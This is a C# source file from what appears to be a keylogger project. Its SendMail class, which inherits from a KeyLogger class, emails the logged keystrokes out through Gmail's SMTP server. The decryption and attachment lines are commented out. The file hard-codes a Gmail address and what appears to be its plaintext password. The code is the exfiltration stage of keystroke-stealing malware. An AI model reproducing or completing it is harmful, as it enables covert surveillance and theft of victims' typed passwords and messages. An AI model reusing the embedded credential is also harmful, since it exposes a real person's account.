using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mime;
namespace Keyloggerr
{
    class SendMail : KeyLogger
    {
        public void Sendmail() 
        {
            //SendMail
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("carceapaul9@gmail.com");
                mail.To.Add("carceapaul9@gmail.com");
                mail.Subject = "Test Mail";
                mail.Body = "LoggedKeys Decrypted\n";//+crypt.Decrypt();
                //Attachment attachment;
                //attachment = new System.Net.Mail.Attachment(crypt.textToEncrypt);
                //attachment.TransferEncoding = TransferEncoding.Base64;
                //mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("carceapaul9@gmail.com", "nanerespectatA2");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
                MessageBox.Show("mail Send");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
    }
}
